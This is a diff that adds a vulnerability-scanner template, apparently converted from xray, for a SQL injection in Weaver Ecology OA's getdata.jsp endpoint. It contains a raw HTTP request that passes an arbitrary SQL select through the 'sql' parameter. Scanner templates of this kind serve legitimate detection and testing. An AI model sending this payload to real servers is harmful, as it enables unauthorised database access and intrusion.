@@ -1,0 +1,22 @@
+id: poc-yaml-ecology-getdata-sqli
+
+info:
+  name: poc-yaml-ecology-getdata-sqli
+  author: yywing
+  severity: high
+  tags: xray-converted,sqli,ct-159072
+  reference:
+    - https://www.cnblogs.com/0day-li/p/14637680.html
+    - https://www.tonguebusy.com/a/yunying/kuaishouyunying/766.html
+
+http:
+  - raw:
+      - |
+        GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20str({{rand_int(1000, 9999)}}*{{rand_int(1000, 9999)}})%20as%20id HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
